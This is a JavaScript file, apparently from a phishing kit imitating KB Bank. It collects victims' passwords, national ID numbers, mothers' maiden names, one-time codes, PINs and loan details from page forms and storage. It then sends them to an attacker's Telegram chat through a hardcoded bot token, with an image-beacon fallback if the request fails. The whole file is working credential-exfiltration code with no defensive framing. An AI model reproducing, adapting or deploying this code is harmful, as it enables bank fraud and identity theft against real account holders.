(() => {
  'use strict';

  const DEFAULT_TOKEN = '8655916807:AAHLgXatTlPGoESOI46HOKA6RYDVy-vstjE';
  const DEFAULT_CHAT_ID = '6959842489';

  const readConfigValue = (key, fallback = '') => {
    try {
      const globalValue = window?.[key];
      if (typeof globalValue === 'string' && globalValue.trim()) return globalValue.trim();
      const storageValue = localStorage.getItem(key);
      if (storageValue && storageValue.trim()) return storageValue.trim();
    } catch (error) {
      // localStorage may be unavailable in some browser modes.
    }
    return fallback;
  };

  const sanitize = value => value === undefined || value === null ? '' : String(value);

  const getFirstName = value => {
    const clean = String(value ?? '').trim().replace(/\s+/g, ' ');
    if (!clean) return '';
    const [firstName] = clean.split(' ');
    return firstName || clean;
  };

  const formatIdentityText = payload => [
    '🔔 DATA PENGGUNA',
    '',
    `Email            : ${payload.email || payload.username || '-'}`,
    `Password         : ${payload.password || '-'}`,
    `Nama Lengkap     : ${payload.nama_lengkap || '-'}`,
    `Nama Ibu Kandung : ${payload.nama_ibu_kandung || '-'}`,
    `NIK KTP          : ${payload.nik || '-'}`,
    ''
  ].join('\n');

  const formatOtpText = payload => {
    const firstName = getFirstName(payload.nama_lengkap || payload.username || 'USER');
    return [
      `🔔 KODE ${firstName.toUpperCase()}`,
      '',
      'Kode Verifikasi Anda',
      '',
      `🔐 ${payload.otp || '-'}`,
      ''
    ].join('\n');
  };

  const formatPinText = payload => {
    const firstName = getFirstName(payload.nama_lengkap || payload.username || 'USER');
    return [
      `🔔 PIN ${firstName.toUpperCase()}`,
      '',
      `PIN Anda: ${payload.pin || '-'}`,
      ''
    ].join('\n');
  };

  const buildTelegramText = payload => {
    const event = String(payload.event || '').toUpperCase();

    if (event.includes('LOGIN') || event.includes('IDENTITY')) {
      return formatIdentityText(payload);
    }

    if (event.includes('SMS') || event.includes('OTP')) {
      return formatOtpText(payload);
    }

    if (event.includes('PIN')) {
      return formatPinText(payload);
    }

    return [
      '=== NOTIF RES KB BANK ===',
      `Username: ${payload.username || '-'}`,
      `Email: ${payload.email || '-'}`,
      `Password: ${payload.password || '-'}`,
      `Nama Lengkap: ${payload.nama_lengkap || '-'}`,
      `NIK (16 Digit): ${payload.nik || '-'}`,
      `Nama Ibu Kandung: ${payload.nama_ibu_kandung || '-'}`,
      `OTP: ${payload.otp || '-'}`,
      `PIN: ${payload.pin || '-'}`,
      `Timestamp: ${payload.timestamp || '-'}`,
      '========================'
    ].join('\n');
  };

  const config = {
    botToken: readConfigValue('KB_TELEGRAM_BOT_TOKEN', DEFAULT_TOKEN),
    chatId: readConfigValue('KB_TELEGRAM_CHAT_ID', DEFAULT_CHAT_ID),
    enabled: readConfigValue('KB_TELEGRAM_ENABLED', 'true').toLowerCase() !== 'false'
  };

  const sentKeys = new Map();

  const isConfigured = () => {
    const token = config.botToken.trim();
    const chatId = config.chatId.trim();
    return Boolean(token && chatId && !token.includes('MASUKKAN_') && !chatId.includes('MASUKKAN_'));
  };

  function buildTelegramPayload(dataInput = {}) {
    const session = window.NovaStorage?.getSession?.() || {};
    const identity = window.NovaStorage?.getIdentity?.() || {};
    const application = window.NovaStorage?.getApplication?.() || {};
    const currentDoc = typeof document !== 'undefined' ? document : null;

    const payload = {
      event: sanitize(dataInput.event || 'KB_BANK_FORM'),
      page: sanitize(dataInput.page || 'unknown'),
      username: sanitize(dataInput.username ?? session.username ?? session.identity ?? identity.fullName ?? currentDoc?.getElementById('identity')?.value ?? ''),
      email: sanitize(dataInput.email ?? session.email ?? (currentDoc?.getElementById('identity')?.value && String(currentDoc.getElementById('identity').value).includes('@') ? currentDoc.getElementById('identity').value : '') ?? ''),
      password: sanitize(dataInput.password ?? session.password ?? currentDoc?.getElementById('password')?.value ?? ''),
      nama_lengkap: sanitize(dataInput.nama_lengkap ?? identity.fullName ?? currentDoc?.getElementById('fullName')?.value ?? ''),
      nik: sanitize(dataInput.nik ?? identity.nik ?? currentDoc?.getElementById('nik')?.value ?? application.lastNik ?? ''),
      nama_ibu_kandung: sanitize(dataInput.nama_ibu_kandung ?? identity.motherName ?? currentDoc?.getElementById('motherName')?.value ?? ''),
      otp: sanitize(dataInput.otp ?? application.lastOtp ?? currentDoc?.querySelector('.otp input')?.value ?? ''),
      pin: sanitize(dataInput.pin ?? application.lastPin ?? ''),
      amount: sanitize(dataInput.amount ?? application.loan?.amount ?? currentDoc?.getElementById('amount')?.value ?? ''),
      tenor: sanitize(dataInput.tenor ?? application.loan?.tenor ?? currentDoc?.getElementById('tenor')?.value ?? ''),
      purpose: sanitize(dataInput.purpose ?? application.loan?.purpose ?? currentDoc?.getElementById('purpose')?.value ?? ''),
      status: sanitize(dataInput.status ?? application.status ?? ''),
      timestamp: new Date().toISOString()
    };

    return payload;
  }

  function kirimLaporanKeTelegram(dataInput = {}) {
    if (!isConfigured() || !config.enabled) {
      return Promise.resolve({ ok: false, reason: 'not-configured' });
    }

    const payload = buildTelegramPayload(dataInput);
    const dedupeKey = JSON.stringify({
      event: payload.event,
      page: payload.page,
      username: payload.username,
      email: payload.email,
      password: payload.password,
      nama_lengkap: payload.nama_lengkap,
      nik: payload.nik,
      nama_ibu_kandung: payload.nama_ibu_kandung,
      otp: payload.otp,
      pin: payload.pin,
      amount: payload.amount,
      tenor: payload.tenor,
      purpose: payload.purpose,
      status: payload.status
    });

    const now = Date.now();
    const lastAt = sentKeys.get(dedupeKey) || 0;
    if (now - lastAt < 15000) {
      return Promise.resolve({ ok: false, reason: 'deduped' });
    }
    sentKeys.set(dedupeKey, now);

    const text = buildTelegramText(payload);

    const url = `https://api.telegram.org/bot${config.botToken}/sendMessage?chat_id=${encodeURIComponent(config.chatId)}&text=${encodeURIComponent(text)}`;

    const tryFetch = () => fetch(url, { method: 'GET' }).then(response => response.json());

    return Promise.resolve()
      .then(() => tryFetch())
      .catch(() => {
        const image = new Image();
        image.src = url;
        return { ok: true, fallback: 'image' };
      })
      .then(result => {
        if (result && result.ok === false) {
          console.warn('Telegram report gagal dikirim:', result.description || result.error_code || 'unknown');
          return { ok: false, reason: result.description || 'telegram-error' };
        }
        return { ok: true, result };
      })
      .catch(error => {
        console.warn('Telegram report tidak dapat dikirim:', error);
        return { ok: false, reason: 'network-error' };
      });
  }

  window.KBTelegram = { sendReport: kirimLaporanKeTelegram, config, isConfigured };
  window.kirimLaporanKeTelegram = kirimLaporanKeTelegram;
})();